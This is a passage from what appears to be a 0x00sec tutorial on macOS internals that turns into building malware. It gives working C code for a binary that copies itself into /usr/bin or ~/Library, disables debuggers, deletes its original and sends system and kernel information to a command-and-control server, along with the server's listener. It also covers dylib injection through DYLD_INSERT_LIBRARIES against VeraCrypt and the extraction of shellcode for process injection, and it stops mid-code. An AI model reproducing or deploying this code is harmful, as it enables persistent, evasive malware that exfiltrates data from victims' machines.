<li><em>Entitlements:</em> Property list files, like the Info.plist, can contain entitlements that grant permissions to applications, specifying their access to system resources.</li>
<li><em>Sandbox:</em> Property list files define sandbox settings that restrict an application’s access to resources, enhancing security and protecting user privacy.</li>
<li><em>Code Signing:</em> Property list files store information related to code signing, verifying the authenticity and integrity of an application.</li>
</ul>
<p>Property List (plist) files can hold various data types and have a hierarchical structure. Here are some commonly used data types and an example of the plist file structure:</p>
<ol>
<li>Data Types:
<ul>
<li>String: A sequence of characters.</li>
<li>Number: Represents numeric values, including integers and floating-point numbers.</li>
<li>Boolean: Represents true or false values.</li>
<li>Date: Represents a specific date and time.</li>
<li>Array: An ordered collection of values.</li>
<li>Dictionary: A collection of key-value pairs, where each key is unique.</li>
</ul>
</li>
</ol>
<p>Here’s an example of a plist file structure:</p>
<pre><code class="lang-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;plist version="1.0"&gt;
  &lt;dict&gt;
    &lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;com.apple.security.files.user-selected.read-only&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;com.apple.security.network.client&lt;/key&gt;
    &lt;true/&gt;
  &lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>In this example, the property list file contains a dictionary with several entitlement keys related to sandboxing. Each key represents a specific entitlement, and the value <code>&lt;true/&gt;</code> indicates that the corresponding entitlement is enabled.</p>
<p>The three entitlements mentioned in this example are:</p>
<ul>
<li><code>com.apple.security.app-sandbox</code>: Enables sandboxing for the application.</li>
<li><code>com.apple.security.files.user-selected.read-only</code>: Allows read-only access to user-selected files.</li>
<li><code>com.apple.security.network.client</code>: Grants the application permission to act as a network client.</li>
</ul>
<p>This simplified example demonstrates how property list files can store entitlements related to sandboxing, providing a structured format for specifying the application’s access and permissions within the sandbox environment.</p>
<ul>
<li>We can use otool to read Info.plist in different formats:</li>
</ul>
<pre><code class="lang-bash">plutil -convert xml1 /Applications/Safari.app/Contents/Info.plist -o - 
plutil -convert json /Applications/Safari.app/Contents/Info.plist -o - 
</code></pre>
<p>Overall, property list files play a crucial role in macOS by providing a structured and standardized format to store important information related to entitlements, sandboxing, code signing, and more. They enable applications and system components to access and manage this data efficiently, contributing to the security and integrity of the macOS ecosystem.</p>
<p>That’s all we need to know for now. There’s more to explore, such as Gatekeeper, Sandboxing, App Bundles, and so on, but these are the most important security mechanisms that matter to us for development. Now let’s delve a bit deeper and discuss internal architecture. Why focus on internals? Well, even though I’m not planning to develop a rootkit or anything as advanced, it’s crucial to understand the OS as thoroughly as possible from a developer’s perspective. After all, we’re writing software.</p>
<h1><a name="mach-apis-6" class="anchor" href="https://0x00sec.org#mach-apis-6"></a>Mach API’s</h1>
<p>Let’s take a quick look at Mach. Initially designed as a communication-centric operating system kernel with robust multiprocessing support, Mach aimed to lay the groundwork for various operating systems. It favored a microkernel architecture, aiming to keep essential OS services like file systems, I/O, memory management, networking, and different OS personalities separate from the kernel.</p>
<p>XNU, whimsically named “X is not UNIX,” serves as the kernel for Mac OS X. Positioned at the core, Darwin and the rest of the OS X software stack rely on the XNU kernel.</p>
<p>XNU stands out as a hybrid operating system, blending a hardware/Io tasking interface from the minimalist Mach microkernel with elements from FreeBSD kernel and its POSIX-compliant API. Understanding how programs map to processes in virtual memory on OS X can be a bit tricky due to overlapping definitions. For example, the term “thread” could refer to either the POSIX API pthreads from BSD or the fundamental unit of execution within a Mach task. Moreover, there are two distinct sets of syscalls, each mapped to positive (Mach) or negative (BSD) numbers.</p>
<p>Mach provides a virtual machine interface, abstracting system hardware—a common feature in many operating systems. Its core kernel is designed to be simple and extensible, boasting an Inter-Process Communication (IPC) mechanism that underpins many kernel services. Notably, Mach seamlessly integrates IPC capabilities with its virtual memory subsystem, leading to optimizations and simplifications across the OS.</p>
<p>On OS X, we deal with “tasks” rather than processes. Tasks, similar to processes, serve as OS-level abstractions containing all the resources needed to execute a program. Technically, Mach refers to its processes as tasks, although the concept of a BSD-style process that encapsulates a Mach task persists. Resources within a task include:</p>
<ul>
<li>A virtual address space</li>
<li>Inter-process communication (IPC) port rights</li>
<li>One or more threads</li>
</ul>
<p>“Ports” serve as an inter-task communication mechanism, using structured messages to transmit information between tasks. Operating solely in kernel space, ports act like P.O. Boxes, albeit with restrictions on message senders. Ports are identified by Task-specific 32-bit numbers.</p>
<p>Threads are units of execution scheduled by the kernel. OS X supports two thread types (Mach and pthread), depending on whether the code originates from user or kernel mode. Mach threads reside at the OS’s lowest level in kernel-mode, while pthreads from the BSD realm execute programs in user-mode. (More in this, later)</p>
<p>Mach redefines the traditional Unix notion of a process into two components: a task and a thread. In the kernel, a BSD process aligns with a Mach task. A task serves as a framework for executing threads, encapsulating resources and defining a program’s protection boundary. Mach ports, versatile abstractions, facilitate IPC mechanisms and resource operations.</p>
<p>IPC messages in Mach are exchanged between threads for communication, carrying actual data or pointers to out-of-line data. Message transfer is asynchronous, with port capabilities exchanged through messages.</p>
<p>Mach’s virtual memory system encompasses machine-independent components like address maps and memory objects, alongside machine-dependent elements like the physical map. Memory objects serve as containers for data mapped into a task’s address space, managed by various pagers handling distinct memory types. Exception ports, assigned to each task and thread, facilitate exception handling, allowing multiple handlers to suspend affected threads, process exceptions, and resume or terminate threads accordingly.</p>
<p>Let’s explore the basics of Mach System Calls, including retrieving system information and performing code injection. This will provide a fundamental understanding of interacting with macOS, By the way, a system call is a function of the kernel invoked by a user space. It can involve tasks like writing to a file descriptor or exiting a program. Typically, these system calls are wrapped by C functions in the standard library.</p>
<h2><a name="baby-steps-7" class="anchor" href="https://0x00sec.org#baby-steps-7"></a>Baby Steps</h2>
<p>If we head over to the <a href="https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/" rel="noopener nofollow ugc">Mach IPC Interface</a> or <a href="https://developer.apple.com/documentation/kernel/" rel="noopener nofollow ugc">Apple documentation</a>  we can find a Mach system call that’s pretty handy for getting basic info about the host system. It tells us stuff like how many CPUs there are, both maximum and available, the physical and logical CPUs, memory size, and the max memory size. This call is <code>host_info()</code>, and it’s super useful for getting details about a host, like what kind of processors are installed, how many are currently available, and the total memory size.</p>
<p>Now, like a lot of Mach “info” calls, <code>host_info()</code> needs a flavor argument to specify what kind of info you want. For instance:</p>
<pre><code class="lang-c">kern_return_t host_info(host_t host, host_flavor_t flavor,
                        host_info_t host_info,
                        mach_msg_type_number_t host_info_count);
</code></pre>
<ul>
<li><code>HOST_BASIC_INFO</code>: Returns basic system information.</li>
<li><code>HOST_SCHED_INFO</code>: Provides scheduler-related data.</li>
<li><code>HOST_PRIORITY_INFO</code>: Offers scheduler-priority-related information.</li>
</ul>
<p>Besides <code>host_info()</code>, other calls like <code>host_kernel_version()</code>, <code>host_get_boot_info()</code>, and <code>host_page_size()</code> can be employed to access miscellaneous system details.</p>
<pre><code class="lang-c">int main() {
    kern_return_t kr; /* the standard return type for Mach calls */
    mach_port_t myhost;
    char kversion[256]; 
    host_basic_info_data_t hinfo;
    mach_msg_type_number_t count;
    vm_size_t page_size;
  

    // Retrieve System Information
    printf("Retrieving System Information...\n");

    // Get send rights to the name port for the current host
    myhost = mach_host_self();

    // Get kernel version
    kr = host_kernel_version(myhost, kversion);
    EXIT_ON_MACH_ERROR("host_kernel_version", kr);

    // Get basic host information
    count = HOST_BASIC_INFO_COUNT; // size of the buffer
    kr = host_info(myhost, HOST_BASIC_INFO, (host_info_t)&amp;hinfo, &amp;count);
    EXIT_ON_MACH_ERROR("host_info", kr);

    // Get page size
    kr = host_page_size(myhost, &amp;page_size);
    EXIT_ON_MACH_ERROR("host_page_size", kr);

    printf("Kernel Version: %s\n", kversion);
    printf("Maximum CPUs: %d\n", hinfo.max_cpus);
    printf("Available CPUs: %d\n", hinfo.avail_cpus);
    printf("Physical CPUs: %d\n", hinfo.physical_cpu);
    printf("Maximum Physical CPUs: %d\n", hinfo.max_cpus);
    printf("Logical CPUs: %d\n", hinfo.logical_cpu);
    printf("Maximum Logical CPUs: %d\n", hinfo.logical_cpu);
    printf("Memory Size: %llu MB\n", (unsigned long long)(hinfo.memory_size &gt;&gt; 20));
    printf("Maximum Memory: %llu MB\n", (unsigned long long)(hinfo.max_mem &gt;&gt; 20));
    printf("Page Size: %u bytes\n", (unsigned int)page_size);

    // Clean up and exit
    mach_port_deallocate(mach_task_self(), myhost);
    exit(0);
}
</code></pre>
<p>So, basically, the code is pretty easy to understand. It just grabs system information and shows things like the Kernel version, right? It’s simple and harmless. But if we want to learn more about system calls, we need something different. How about something that acts more like malware?  But let’s keep it simple at first. We can start by writing a code that write a copy of itself to either <code>/usr/bin/</code> or <code>/Library/</code>.</p>
<p>To achieve this kind of behavior, we need to use task operations because we need to control another process and access system processes. I found specific Mach system calls like <code>pid_for_task()</code>, <code>task_for_pid()</code>, <code>task_name_for_pid()</code>, and <code>mach_task_self()</code>, which allow conversion between Mach task ports and Unix PIDs. However, they essentially bypass the capability model, which means they are restricted on macOS due to UID checks, entitlements, SIP, etc., limiting their use, and are not documented as part of a public API and are privileged, typically accessible only by processes with elevated privileges like root or members of the <code>procview group</code>. This limitation poses a challenge because malware would need elevated privileges or execution on a privileged account to work unless obtained through various means.</p>
<p>Thus, we can’t use <code>task_for_pid</code> on Apple platform binaries due to SIP. However, if permitted, we would have the port and could essentially do anything we want including what I’m about to explain. Therefore, So for this example we’ll use <code>mach_task_self()</code> as it typically does not require privileges. It retrieves information about the current task, depending on the security policies enforced.</p>
<pre><code class="lang-c">void hide_process() {
    mach_port_t task_self = mach_task_self();
    kern_return_t kr;

    // Set exception ports to disable debuggers.
    kr = task_set_exception_ports(task_self, EXC_MASK_ALL, MACH_PORT_NULL, EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, THREAD_STATE_NONE);
    if (kr != KERN_SUCCESS) {
        printf("Uh-oh: Failed to set exception ports: %s\n", mach_error_string(kr));
        exit(EXIT_FAILURE);
    }

    printf("Shhh... Process is now hidden\n");
}
</code></pre>
<p>the function obtains the task port for the current process using <code>mach_task_self()</code>, which essentially retrieves a send right to a task port. In the Mach kernel, a task port represents a task, and sending a message to this port enables actions to be performed on the corresponding task.</p>
<p>Next, to set the exception ports to disable debuggers and other forms of external monitoring. This is achieved through the <code>task_set_exception_ports()</code> function call. and any received messages should be directed to a null Mach port. The process then exits with a failure status.</p>
<pre><code class="lang-c">void copy_file(const char *source_path, const char *dest_path) {
    FILE *source_file = fopen(source_path, "rb");
    if (source_file == NULL) {
        printf("Oops: Failed to open source file for copying: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    FILE *dest_file = fopen(dest_path, "wb");
    if (dest_file == NULL) {
        printf("Oops: Failed to open destination file for copying: %s\n", strerror(errno));
        fclose(source_file); 
        exit(EXIT_FAILURE);
    }

    char buffer[BUF_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), source_file)) &gt; 0) {
        fwrite(buffer, 1, bytes_read, dest_file);
    }

    fclose(source_file);
    fclose(dest_file);

    // Grant execute permission for the copied binary
    if (chmod(dest_path, PERMISSIONS) == -1) {
        printf("Oops: Failed to set execute permission for %s\n", dest_path);
        exit(EXIT_FAILURE);
    }

    printf("Hey! copied from %s to %s\n", source_path, dest_path);
}
</code></pre>
<p>The function reads data from the source file in chunks and writes it to the destination file until the entire file is copied. After copying, it sets execute permission for the copied binary using <code>chmod()</code> to make it executable.</p>
<pre><code class="lang-c">// Main function
int main(int argc, char *argv[]) {
    // Determine home directory
    const char *home_dir;
    struct passwd *pw = getpwuid(getuid());
    if (pw == NULL) {
        printf("Oops: Failed to get home directory\n");
        exit(EXIT_FAILURE);
    }
    home_dir = pw-&gt;pw_dir;

    // Construct malware path
    char home_malware_path[PATH_MAX_LENGTH];
    snprintf(home_malware_path, sizeof(home_malware_path), "%s/Library/%s", home_dir, MALWARE_NAME);

    // Check if we have root privileges
    if (geteuid() == 0) {
        // Attempt to copy malware to system directory
        const char *system_malware_path = "/usr/bin/" MALWARE_NAME;
        if (access(system_malware_path, F_OK) != 0) {
            copy_file(argv[0], system_malware_path);
            execute_malware(system_malware_path);
        }
    } else {
        // Attempt to copy malware to user's home directory
        if (access(home_malware_path, F_OK) != 0) {
            copy_file(argv[0], home_malware_path);
            greet_user();
        }
    }

    // Hide the process
    hide_process();

    // Vanish, Damn
    remove(argv[0]);

    return EXIT_SUCCESS;
}
</code></pre>
<p>So the logic is as follows: It first checks if it has root privileges by calling geteuid(). If it does, it attempts to copy itself to /usr/bin/, and if successful, it executes the copied binary. If it doesn’t have root privileges, it attempts to copy itself to ~/Library/ (the user’s home directory). If successful, it prints “Hello, World!”. After copying itself it calls hide_process() to attempt to hide the process from detection. Finally, it removes the original binary file to erase traces of its presence.</p>
<p>This demonstrates a basic technique used by malware to hide itself on a system by copying itself to a system directory (/usr/bin/) or the user’s home directory (~/Library/) and then attempting to hide its process from detection.</p>
<p>This is far from being a malicious code, but it does provide us with valuable insights into working with the Mach API and conducting low-level system operations. Through this example, we’ve gained familiarity with essential concepts such as process management and communication.</p>
<pre data-code-wrap="asm"><code class="lang-plaintext">0x100003e79 &lt;+505&gt;: callq  0x100003c50               ; hide_process
0x100003e7e &lt;+510&gt;: movq   0x17b(%rip), %rax         ; (void *)0x0000000000000000
0x100003e85 &lt;+517&gt;: movl   (%rax), %edi
0x100003e87 &lt;+519&gt;: movl   -0x18(%rbp), %esi
0x100003e8a &lt;+522&gt;: callq  0x100003ec6               ; symbol stub for: mach_port_deallocate
0x100003e8f &lt;+527&gt;: xorl   %edi, %edi
0x100003e91 &lt;+529&gt;: movl   %eax, -0x21ec(%rbp)
0x100003e97 &lt;+535&gt;: callq  0x100003eb4               ; symbol stub for: exit
</code></pre>
<p>Here we put a our little program into a debugger, and as you can see specially in the disassembly part there’s instructions correspond to our operation like <code>/usr/bin/</code> also you can notice the cleanup operations are performed, such as deallocating  port and exiting the program.</p>
<h2><a name="the-naive-way-8" class="anchor" href="https://0x00sec.org#the-naive-way-8"></a>The Naive Way</h2>
<p>After infecting a new host, let’s ensure our malware notifies us of its presence by sending information about the host. Although this method might seem amateurish - a malware shouldn’t connect to a Command &amp; Control server (C2) initially - since we’re just exploring macOS as a new territory, it’s a starting point. We collect system information such as the system name, release version, machine architecture, hardware model, user ID, home directory, etc., and then send this information to the C2. For retrieving or modifying information about the system and environment, we can make use of <a href="https://developer.apple.com/documentation/kernel/1387446-sysctlbyname" rel="noopener nofollow ugc">Developer Apple - sysctlbyname</a>. This function enables us to retrieve specific system information, such as the cache line size, directly from the system kernel.</p>
<p>However, when it comes to System Owner/User Discovery, we typically access user-related data through standard POSIX interfaces like <code>getpwuid()</code>, relying on these interfaces as discussed before. To fetch the hardware model, we would replace <code>"hw.cachelinesize"</code> with <code>"hw.model"</code> in the <code>sysctlbyname</code> function call.</p>
<p>Next, we want to gather more information about the host, not just its hardware model. Now, you may wonder why we don’t just use the first example you introduced. Well, it’s simple. This is to showcase how we access user-related data through standard POSIX interfaces. However, if you want to introduce the hardware model in the above example, just</p>
<pre><code class="lang-c">count = sizeof(model); kr = sysctlbyname("hw.model", model, &amp;count, NULL, 0); EXIT_ON_MACH_ERROR("sysctl hw.model", 1);
</code></pre>
<p>we also wanna send some information like kernel version, for possible known vulnerabilities, to escalate, So here’s an example, we use the same function as to get hardware model</p>
<pre><code class="lang-c">size_t len = BUF_SIZE;
if (sysctlbyname("kern.version", &amp;kernel_version, &amp;len, NULL, 0) == 0) {
	send_data(sockfd, "\nKernel Version: ");
	send_data(sockfd, kernel_version);
</code></pre>
<p>Now let’s dump and send more information about the profile of the infected host, including details such as System Name,  Architecture, Login shell,  Home directory and any other relevant data that could aid in further exploiting or maintaining access to the compromised system, W’ll use function such as <code>uname</code>, <code>getpwuid</code>, and <code>getgrgid</code>,  Let’s take a look at the code,</p>
<pre><code class="lang-c">void system_info(int sockfd) {
  struct utsname sys_info;
  char kernel_version[BUF_SIZE];

  // Get system information
  if (uname( &amp; sys_info) != 0) {
    send_error("Failed to get system information");
    return;
  }

  send_data(sockfd, "\nSystem Name: ");
  send_data(sockfd, sys_info.sysname);
  send_data(sockfd, "\nRelease Version: ");
  send_data(sockfd, sys_info.release);
  send_data(sockfd, "\nMachine Architecture: ");
  send_data(sockfd, sys_info.machine);
  send_data(sockfd, "\nOperating System: ");
  send_data(sockfd, sys_info.sysname);
  send_data(sockfd, "\nVersion: ");
  send_data(sockfd, sys_info.version);
</code></pre>
<p>So, the function is pretty self-explanatory; it simply provides a snapshot of the system and user environment, which is crucial for gathering information on potential targets. However, since malware typically only has one chance for infection, it needs to be self-reliant before attempting to Phone Home. This is why the approach of using a dummy malware, primarily for testing and exploring options before developing an actual malware, is essential.</p>
<p>Nevertheless, deploying a dummy malware still provides attackers with a significant amount of information that could be leveraged for subsequent targeted attacks or exploiting vulnerabilities, whether in the kernel or user land. The malware could be multi-staged to ensure stealth and a low profile. This code can act as stage 1 of an attack, proliferating itself in the system, waiting to activate stage 2, and so on. These types of attacks are advanced and hard to detect, especially in environments like macOS, where malware can remain undetected for years.</p>
<p>Another type of information gathering employed by macOS malware, as seen in some reports, involves ‘LOLBins’ (Living off the Land Binaries). You can program the malware to simply execute <code>/usr/sbin/system_profiler -nospawn -detailLevel full</code>,  For example.</p>
<pre><code class="lang-c">void system_profiler(int sockfd) {
  FILE * fp;
  char buffer[BUF_SIZE];

  // Execute
  fp = popen("/usr/sbin/system_profiler -nospawn -detailLevel full", "r");
  if (fp == NULL) {
    send_error("Failed");
    return;
  }

  // Read command output and send over to C2 
  while (fgets(buffer, BUF_SIZE, fp) != NULL) {
    send_data(sockfd, buffer);
  }

  pclose(fp);
}
</code></pre>
<p>This command alone saves the trouble and provides all the information about a host that an attacker can gather. However, the catch is that such commands are visible and can be easily flagged. Despite this, it remains an easy and effective method for malware to extract details from the infected host.</p>
<p>Alright, so how do we transmit the data? We use <code>socket</code>. This API allows us to send data to the connected endpoint, which in this case is the Command &amp; Control server. Data is sent in the form of strings. To ensure that the data is properly formatted and transmitted over the socket to the C2 server, we rely on functions like <code>send()</code> for sending data, and file I/O functions such as <code>popen()</code> and <code>fgets()</code> for reliable reading and sending of data. It’s pretty simple.</p>
<p>The C2 server is also straightforward, designed solely for handling incoming connections. It won’t have any protection mechanisms to hide itself from the system where it’s running, but this server is basic for demonstration purposes only. I recommend implementing encryption, setting up a database to organize data, and generating a temporary ID to associate with each instance.</p>
<p>The extraction module (ext) starts an autonomous thread listening for incoming connections from malware instances. Once connected, the module simply prints the content of the incoming connection (which is the information extracted by the client) to the standard output.</p>
<pre><code class="lang-c">// The server will keep listening for incoming connections indefinitely
while (1) {
    // Accept a new connection from a client
    cltlen = sizeof(cltaddr);
    cltfd = accept(dexft_fd, (struct sockaddr *) &amp;cltaddr, &amp;cltlen);

    // Check if the accept call was successful
    if (cltfd &lt; 0) {
        // If accept failed, print an error message and continue listening
        printf("Failed to accept incoming connection, %d\n", cltfd);
        continue;
    }

    // Print out information about the connected client
    printf("Collecting data from client %s:%d...\n", inet_ntoa(cltaddr.sin_addr), ntohs(cltaddr.sin_port));

    // Receive data from the client and process it
    while ((br = recv(cltfd, buf, BUF_SIZE, 0)) &gt; 0) {
        // Write the received data to the standard output
        fwrite(buf, 1, br, stdout);
    }

    // Check if an error occurred during data reception
    if (br &lt; 0) {
        printf("ERROR: Failed to receive data from client!\n");
    }

    // Close the client socket
    close(cltfd);
}

return NULL;

</code></pre>
<p>As you can see, the code itself is quite simple yet functional. Once the client is executed, the server collects data from the connected clients, and then closes the connection before resuming listening for new connections,</p>
<pre><code class="lang-sh">Collecting data from client ...

System Name: Darwin
Release Version: 19.6.0
Machine Architecture: x86_64
Operating System: Darwin
</code></pre>
<p>Obviously, this will get flagged within seconds if there’s a security mechanism in place. Why, you may ask? Well, the behavior exhibited here screams malware—from establishing a connection to sending system information and continuously receiving and executing commands from a remote server. The network traffic pattern alone is a red flag. Plus, the transmission of system information immediately after connection establishment… But the good news is that most Mac users assume they’re safe by default, so they don’t entertain the idea that capable malware could go unnoticed.</p>
<p>So, if this were a targeted attack, something with a bit of obfuscation, perhaps polymorphic and advanced covert channels for communication in place, would get the job done. However, this explanation provides a simple overview of how dummy malware can be used as a learning piece of code before developing actual malware. Next, we’ll delve into a topic that I find quite interesting. Yes, you guessed it;</p>
<h1><a name="code-injection-9" class="anchor" href="https://0x00sec.org#code-injection-9"></a>Code Injection</h1>
<p>Actually, exploring Code Injection deserves its own article, and I’ll include some resources at the end. However, for now, let’s focus on two techniques that I find quite effective.  So, Let’s begin by introducing the first technique, which involves leveraging environment variables or DYLD_INSERT_LIBRARIES for code injection.</p>
<p>DYLD_INSERT_LIBRARIES is actually a powerful feature that allows users to preload dynamic libraries into applications, Both developers and attackers can inject code into running processes without modifying the original executable file is commonly used to intercept function calls, manipulate program behavior, or even introduce malicious functionality into legitimate application, As we gone see, It’s basically a colon separated list of dynamic libraries to load before the ones specified in the program. This lets you test new modules of existing dynamic shared libraries that are used in flat-namespace images by loading a temporary dynamic shared library with just the new modules.</p>
<p>In simple term’s, it will load any dylibs you specify in this variable before the program loads, essentially injecting a dylib into the application, So for example</p>
<pre><code class="lang-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
__attribute__((constructor))

void foo() {
  printf("Dynamic library injected! \n");
  system("/bin/bash -c 'echo Library injected!'");
}
</code></pre>
<p>As you can see we have a function <code>foo()</code> that prints to let us know that we successful injected a library and a system command that execute a shell to echo basically the same thing and that <code>attribute((constructor))</code> marks the function run before the application’s main function, into which we injected the <code>dylib</code>, piece of cake right, But how do we know identify binaries vulnerable to environment variable injection, on that later, but first let’s just try it on one of our previous program, So just compile that code like any other program and run it.</p>
<pre><code class="lang-sh">~ &gt; gcc -dynamiclib inject.c -o inject.dylib

~ &gt; DYLD_INSERT_LIBRARIES=inject.dylib ./foo
Dynamic library injected!
Library injected!
</code></pre>
<p>et voilà, When affected, what happens is that it loads any dylibs specified in this variable before the program loads, essentially injecting a dylib into the application. This could potentially lead to privilege escalation, right? Not so fast on the Apple platform binaries. As of macOS 10.14, third-party developers can opt in to a <a href="https://developer.apple.com/documentation/security/hardened_runtime_entitlements" rel="noopener nofollow ugc">hardened runtime</a> for their application, which can prevent the injection of dylibs using this technique.</p>
<p>So, basically, we can still perform injection when the application is not defined as having a “Hardened Runtime” and therefore allows the injection of dylibs using the environment variable. Alternatively, when the binary is using a hardened runtime and the developer released it with the appropriate entitlements, let’s go over this one more time:</p>
<ul>
<li>The “Disable-library-validation” entitlement allows any dylib to run on the binary even without checking who signed the file and the library. This permission usually exists in programs that allow community-written plugins.</li>
<li>The <code>com.apple.security.cs.allow-dyld-environment-variables</code> entitlement loosens the hardened runtime restrictions and allows the use of <code>DYLD_INSERT_LIBRARIES</code> to inject a library.</li>
</ul>
<p>Alright on possible target application, For example to run this on Safari.app It won’t work, because is hardened and lacks the matching entitlement,</p>
<p><img src="https://0xf00sec.github.io/images/IMG3.png" width="690" height="190"> </p>
<p>But that doesn’t necessarily imply that the application is not hardened, as there are other Hardened Runtime features that may not be reflected in the entitlements. So, to expedite the process, I found that Veracrypt is not using Hardened Runtime. Therefore, I’m going to use it as an example for the entire article. Sorry :), Now, let’s attempt to inject it, but first…</p>
<pre><code class="lang-c">__attribute__((constructor))

static void customConstructor(int argc, const char **argv)
{
printf("Foo!\n");
syslog(LOG_ERR, "Dylib injection successful in %s\n", argv[0]);
}
</code></pre>
<p>So, we simply print ‘foo’ and log a message using the <code>syslog()</code> function, which logs an error message indicating successful injection of a dynamic library (dylib) along with the name of the program. Let’s try it. If we see the following output, it seems that we’ve successfully loaded the library:</p>
<p><img src="https://0xf00sec.github.io/images/IMG4.png" width="690" height="285"> </p>
<p>If we attempt to use <code>DYLD_INSERT_LIBRARIES</code> in another binary that is hardened and lacks the matching entitlement, we won’t be able to load the library, and consequently, we won’t see the desired output.</p>
<p>However, some internal components of macOS expect threads to be created using the BSD APIs and have all Mach thread structures and <code>pthread</code> structures set up properly. This can present challenges, especially with changes introduced in macOS 10.14.</p>
<p>To address this issue, I came across a piece of code called <a href="https://newosxbook.com/src.jl?tree=listings&amp;file=inject.c" rel="noopener nofollow ugc">inject.c</a>. Additionally, I highly recommend reading the “Mac Hacker’s Handbook” as it provides invaluable insights and includes great examples of interprocess code injection.</p>
<p>From my understanding, the transition from Mach thread APIs to pthread APIs in macOS, particularly concerning the initialization of thread structures, presents challenges. However, the discovery of the <code>_pthread_create_from_mach_thread</code> function provides a viable alternative for initializing pthread structures from bare Mach threads. This ensures compatibility and proper functioning of threaded applications across different macOS versions.</p>
<p>For those interested, I’ve included examples demonstrating how to inject code to call <code>dlopen</code> and load a dylib into a remote mach task: <a href="https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a" rel="noopener nofollow ugc">Gist 1</a> &amp; <a href="https://gist.github.com/vocaeq/fbac63d5d36bc6e1d6d99df9c92f75dc" rel="noopener nofollow ugc">Gist 2</a>"</p>
<p>Alright, let’s discuss the second technique. It’s similar to methods used on Windows, and one common approach is process injection, which is the ability for one process to execute code in a different process. In Windows, this is often utilized to evade detection by antivirus software, for example, through a technique known as DLL hijacking. This allows malicious code to masquerade as part of a different executable. In macOS, this technique can have significantly more impact due to the differences in permissions between applications.</p>
<p>In the classic Unix security model, each process runs as a specific user. Each file has an owner, group, and flags that determine which users are allowed to read, write, or execute that file. Two processes running as the same user have the same permissions; it is assumed there is no security boundary between them. Users are considered security boundaries; processes are not. If two processes are running as the same user, then one process could attach to the other as a debugger, allowing it to read or write the memory and registers of that other process. The root user is an exception, as it has access to all files and processes. Thus, root can always access all data on the computer, whether on disk or in RAM.</p>
<p>This was essentially the same security model as macOS until the introduction of …  yep, SIP (System Integrity Protection)</p>
<h2><a name="os-x-shellcode-injection-10" class="anchor" href="https://0x00sec.org#os-x-shellcode-injection-10"></a>OS X Shellcode Injection</h2>
<p>Alright, so we’re going to write a simple shellcode injection program where the malware’s host process injects shellcode into the memory of a remote process. But before we proceed, let’s write a simple shellcode for testing purposes.</p>
<p>Writing 64-bit assembly on macOS differs somewhat from ELF. Here, you just need to understand the macOS executable file format, known as Mach-O. However, for simplicity, we’ll stick with the x86_64 architecture and we can later use a linker for Mach-O executables.</p>
<p>A simple “Hello World” program starts by declaring two sections: <code>.data</code> and <code>.text</code>. The <code>.data</code> section is used for storing initialized data, while the <code>.text</code> section contains executable code. Then we define the <code>_main</code> function as the entry point of the program, followed by a reference point in the code, which we’ll call <code>trick</code>. The <code>trick</code> section will be followed by a <code>call</code> instruction that invokes the <code>continue</code> subroutine and pops the address of the string ‘Hello World!’. Also, if you notice in the code, we have a system call at the end that exits our program. The first syscall is for writing data.</p>
<pre><code class="lang-c">section .data
section .text

global _main
	_main:

start:
	jmp trick

continue:
	pop rsi            ; Pop string address into rsi
	mov rax, 0x2000004 ; System call write = 4
	mov rdi, 1         ; Write to standard out = 1
	mov rdx, 14        ; The size to write
	syscall            ; Invoke the kernel
	mov rax, 0x2000001 ; System call number for exit = 1
	mov rdi, 0         ; Exit success = 0
	syscall            ; Invoke the kernel
	
trick:
	call continue
	db "Hello World!", 0, 0
</code></pre>
<p>Alright, it’s time to compile. I typically use NASM for assembling my code. Remember what I mentioned about using the linker to create Mach-O executables? Well, after assembling the code with NASM, we’ll need to link it using <code>ld</code>. This linker not only brings together the assembled code but also incorporates necessary system libraries.</p>
<pre><code class="lang-sh">~ &gt; ./nasm -f macho64 Hello.asm -o hello.o &amp;&amp; ld ./Hello.o -o Hello -lSystem -syslibroot `xcrun -sdk macosx --show-sdk-path`

~ &gt; ./Hello
Hello World!
</code></pre>
<p>Pretty sophisticated, right? Now, to actually turn it into machine code that we can use for injection, it needs to be converted into a hexadecimal representation. This representation consists of a small series of bytes that represent executable machine-language code. It essentially represents the exact sequence of instructions that the processor will execute. For this, we can utilize <code>objdump</code>.</p>
<pre><code class="lang-sh">~ &gt; objdump -d ./Hello | grep '[0-9a-f]:'| grep -v 'file'| cut -f2 -d:| cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '| sed 's/ $//g'| sed 's/ /\\x/g'| paste -d '' -s | sed 's/^/"/'| sed 's/$/"/g'

`\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a`
</code></pre>
<p>If, for some reason, you can’t extract the <code>shellcode</code> solely relying on <code>objdump</code>, you can always script kiddy a simple py, to parse the assembly output;</p>
<pre><code class="lang-python">def extract_shellcode(objdump_output):
    shellcode = ""
    length = 0
    lines = objdump_output.split('\n')
    
    for line in lines:
        if re.match("^[ ]*[0-9a-f]*:.*$", line):
            line = line.split(":")[1].lstrip()
            x = line.split("\t")
            opcode = re.findall("[0-9a-f][0-9a-f]", x[0])
            for i in opcode:
                shellcode += "\\x" + i
                length += 1

    return shellcode, length

def main():
    objdump_output = sys.stdin.read()
    shellcode, length = extract_shellcode(objdump_output)
    
    if shellcode == "":
        print("Bad")
    else:
        print("\n" + shellcode)

if __name__ == "__main__":
    main()
</code></pre>
<p>But does the <code>shellcode</code> work? To ensure its functionality, we should test whether we can perform a simple injection. One way to do this is by compiling the <code>shellcode</code> and storing it as a global variable within the executable’s <code>__TEXT,__text</code> section. We can achieve this by declaring the <code>shellcode</code> as a variable within the code itself. Here’s a simple example:</p>
<pre><code class="lang-c">const char output[] __attribute__((section("__TEXT,__text"))) =  "
